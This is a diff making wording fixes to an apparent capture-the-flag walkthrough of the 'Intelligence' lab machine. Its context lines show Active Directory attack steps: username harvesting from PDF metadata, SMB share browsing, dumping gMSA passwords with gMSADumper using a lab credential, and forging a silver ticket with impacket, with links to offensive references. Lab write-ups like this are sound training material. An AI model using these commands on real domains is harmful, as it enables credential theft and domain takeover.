@@ -256,7 +256,7 @@ Holly hell got so many pdfs. Total 99 files
 2020-03-21-upload.pdf  2020-06-14-upload.pdf  2020-09-05-upload.pdf  2020-12-15-upload.pdf
 ```
 
-Again dong `exiftool` got much more usernames, total 30
+Running `exiftool` tool again to new downloaded files and get more usernames, total 30
 ```bash
 ❯ exiftool * -Creator -s -s -s | grep -v '========' | head -n -1 | sort | uniq | wc -l
 30
@@ -376,7 +376,7 @@ There are 2 shares in SMB that looks interesting
 	dr--r--r--                0 Mon Apr 19 06:21:46 2021	Tiffany.Molina
 ```
 
-Got the `user.txt` from "Tiffany.Molina" User folder and there is a another on the box "Ted.Graves".
+Got the `user.txt` from "Tiffany.Molina" User folder and there's another user on the box "Ted.Graves".
 ```bash
 smb: \Tiffany.Molina\Desktop\> dir
   .                                  DR        0  Mon Apr 19 06:21:46 2021
@@ -477,7 +477,7 @@ And here is the sortest path to the DOMAIN.
 
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#gmsa-attributes-in-the-active-directory
 
-Reading GSMA passwords with [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+Reading GMSA passwords with [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
 ```bash
 ❯ python gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l dc.intelligence.htb
 Users or groups who can read password for svc_int$:
@@ -494,7 +494,7 @@ And "svc_int$" has the constrained delegation privilege to the computer `S-1-5-2
 
 * https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket
 
-Before generating Silver ticket, sync time with the target domain
+Before generating Silver ticket, sync time with the target domain: `sudo ntpdate 10.10.10.248`
 
 Generating silver ticket with impacket getST.py script
 ```bash
@@ -503,7 +503,7 @@ Generating silver ticket with impacket getST.py script
 
 ![](screenshots/silver-ticket.png)
 
-Then generated `Administrator.ccache` in the "`KRB5CCNAME`" environment variable
+Then Store `Administrator.ccache` path in a "`KRB5CCNAME`" environment variable
 ```bash
 export KRB5CCNAME=./Administrator.ccache
 ```
